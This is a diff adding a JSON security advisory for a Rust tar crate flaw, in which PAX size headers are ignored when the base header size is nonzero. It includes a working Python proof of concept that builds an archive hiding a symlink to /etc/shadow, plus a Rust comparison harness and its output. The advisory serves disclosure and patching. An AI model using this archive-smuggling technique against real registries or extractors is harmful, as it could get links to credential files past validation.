@@ -1,0 +1,66 @@
+{
+  "id": "GHSA-gchp-q4r4-x4ff",
+  "modified": "2026-03-25T18:49:15.729325Z",
+  "published": "2026-03-20T17:25:05Z",
+  "aliases": [
+    "CVE-2026-33055",
+    "RUSTSEC-2026-0068"
+  ],
+  "related": [
+    "CGA-jh5j-68c4-238r"
+  ],
+  "summary": "tar-rs incorrectly ignores PAX size headers if header size is nonzero",
+  "details": "### Summary\n\nAs part of [CVE-2025-62518](https://www.cve.org/CVERecord?id=CVE-2025-62518) the astral-tokio-tar project was changed to correctly honor PAX size headers in the case where it was different from the base header.\n\nHowever, it was missed at the time that this project (the original Rust `tar` crate) had a conditional logic that skipped the PAX size header in the case that the base header size was nonzero - almost the inverse of the astral-tokio-tar issue.\n\nThe problem here is that *any* discrepancy in how tar parsers honor file size can be used to create archives that appear differently when unpacked by different archivers.\n\nIn this case, the tar-rs (Rust `tar`) crate is an outlier in checking for the header size - other tar parsers (including e.g. Go `archive/tar`) unconditionally use the PAX size override.\n\n\n### Details\n\nhttps://github.com/astral-sh/tokio-tar/blob/aafc2926f2034d6b3ad108e52d4cfc73df5d47a4/src/archive.rs#L578-L600\nhttps://github.com/alexcrichton/tar-rs/blob/88b1e3b0da65b0c5b9750d1a75516145488f4793/src/archive.rs#L339-L344\n\n### PoC\n\n(originally posted by https://github.com/xokdvium)\n\n\n\u003e I was worried that cargo might be vulnerable to malicious crates, but it turns out that crates.io has been rejecting both symlinks and hard links:\n\nIt seems like recent fixes to https://edera.dev/stories/tarmageddon have introduced a differential that could be used to smuggle symlinks into the registry that would get skipped over by `astral-tokio-tar` but not by `tar-rs`.\n\nhttps://github.com/astral-sh/tokio-tar/blob/aafc2926f2034d6b3ad108e52d4cfc73df5d47a4/src/archive.rs#L578-L600\nhttps://github.com/alexcrichton/tar-rs/blob/88b1e3b0da65b0c5b9750d1a75516145488f4793/src/archive.rs#L339-L344\n\n```python\n#!/usr/bin/env python3\nB = 512\n\n\ndef pad(d):\n    r = len(d) % B\n    return d + b\"\\0\" * (B - r) if r else d\n\n\ndef hdr(name, size, typ=b\"0\", link=b\"\"):\n    h = bytearray(B)\n    h[0 : len(name)] = name\n    h[100:107] = b\"0000644\"\n    h[108:115] = h[116:123] = b\"0001000\"\n    h[124:135] = f\"{size:011o}\".encode()\n    h[136:147] = b\"00000000000\"\n    h[148:156] = b\"        \"\n    h[156:157] = typ\n    if link:\n        h[157 : 157 + len(link)] = link\n    h[257:263] = b\"ustar\\x00\"\n    h[263:265] = b\"00\"\n    h[148:155] = f\"{sum(h):06o}\\x00\".encode()\n    return bytes(h)\n\n\nINFLATED = 2048\npax_rec = b\"13 size=2048\\n\"\n\nar = bytearray()\nar += hdr(b\"./PaxHeaders/regular\", len(pax_rec), typ=b\"x\")\nar += pad(pax_rec)\n\ncontent = b\"regular\\n\"\nar += hdr(b\"regular.txt\", len(content))\nmark = len(ar)\nar += pad(content)\n\nar += hdr(b\"smuggled\", 0, typ=b\"2\", link=b\"/etc/shadow\")\nar += b\"\\0\" * B * 2\n\nused = len(ar) - mark\nif used \u003c INFLATED:\n    ar += b\"\\0\" * (((INFLATED - used + B - 1) // B) * B)\nar += b\"\\0\" * B * 2\n\nopen(\"smuggle.tar\", \"wb\").write(bytes(ar))\n```\n\n`tar-rs` and `astral-tokio-tar` parse it differently, with `astral-tokio-tar` skipping over the symlink (so presumably the check from https://github.com/rust-lang/crates.io/blob/795a4f85dec436f2531329054a4cfddeb684f5c5/crates/crates_io_tarball/src/lib.rs#L92-L102 wouldn't disallow it).\n\n```rust\nuse std::fs;\nuse std::path::PathBuf;\n\nfn sync_parse(data: \u0026[u8]) {\n    println!(\"tar:\");\n    let mut ar = tar::Archive::new(data);\n    for e in ar.entries().unwrap() {\n        let e = e.unwrap();\n        let path = e.path().unwrap().to_path_buf();\n        let kind = e.header().entry_type();\n        let link: Option\u003cPathBuf\u003e = e.link_name().ok().flatten().map(|l| l.to_path_buf());\n        match link {\n            Some(l) =\u003e println!(\"  {:20} {:?} -\u003e {}\", path.display(), kind, l.display()),\n            None =\u003e println!(\"  {:20} {:?}\", path.display(), kind),\n        }\n    }\n    println!();\n}\n\nasync fn async_parse(data: Vec\u003cu8\u003e) {\n    println!(\"astral-tokio-tar:\");\n    let mut ar = tokio_tar::Archive::new(data.as_slice());\n    let mut entries = ar.entries().unwrap();\n    while let Some(e) = tokio_stream::StreamExt::next(\u0026mut entries).await {\n        let e = e.unwrap();\n        let path = e.path().unwrap().to_path_buf();\n        let kind = e.header().entry_type();\n        let link: Option\u003cPathBuf\u003e = e.link_name().ok().flatten().map(|l| l.to_path_buf());\n        match link {\n            Some(l) =\u003e println!(\"  {:20} {:?} -\u003e {}\", path.display(), kind, l.display()),\n            None =\u003e println!(\"  {:20} {:?}\", path.display(), kind),\n        }\n    }\n    println!();\n}\n\n#[tokio::main]\nasync fn main() {\n    let path = std::env::args().nth(1).unwrap_or(\"smuggle.tar\".into());\n    let data = fs::read(\u0026path).unwrap();\n    sync_parse(\u0026data);\n    async_parse(data).await;\n}\n```\n\n```\ntar:\n  regular.txt          Regular\n  smuggled             Symlink -\u003e /etc/shadow\n\nastral-tokio-tar:\n  regular.txt          Regular\n```\n\n### Impact\n\nThis can affect anything that uses the `tar` crate to parse archives and expects to have a consistent view with other parsers. In particular it is known to affect crates.io which uses `astral-tokio-tar` to parse, but cargo uses `tar`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "tar",
+        "purl": "pkg:cargo/tar"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.4.45"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.4.44",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-gchp-q4r4-x4ff/GHSA-gchp-q4r4-x4ff.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/alexcrichton/tar-rs/security/advisories/GHSA-gchp-q4r4-x4ff"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33055"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/alexcrichton/tar-rs/commit/de1a5870e603758f430073688691165f21a33946"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/alexcrichton/tar-rs"
+    },
+    {
+      "type": "WEB",
+      "url": "https://rustsec.org/advisories/RUSTSEC-2026-0068.html"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.cve.org/CVERecord?id=CVE-2025-62518"
+    }
+  ]
+}
